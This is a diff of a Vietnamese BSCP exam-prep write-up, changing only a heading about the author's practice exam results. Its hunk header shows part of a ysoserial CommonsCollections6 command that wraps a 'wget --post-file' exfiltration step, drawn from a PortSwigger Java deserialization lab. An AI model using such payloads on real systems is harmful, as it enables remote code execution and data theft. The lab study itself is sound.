@@ -190,7 +190,7 @@ java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections6 'wget --post-fil
 
 ###### Lưu ý: Cách khai thác Java Deserialize ở trên dựa vào bài lab của PortSwigger là [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons).
 
-##### 4) Kết quả Practice Exam BSCP:
+##### 4) Kết quả Practice Exam BSCP của mình:
 
 ![image-20211215155436265](https://user-images.githubusercontent.com/61876488/146226623-dd2ddd99-5b72-425c-b055-2d6316414c69.png)
 
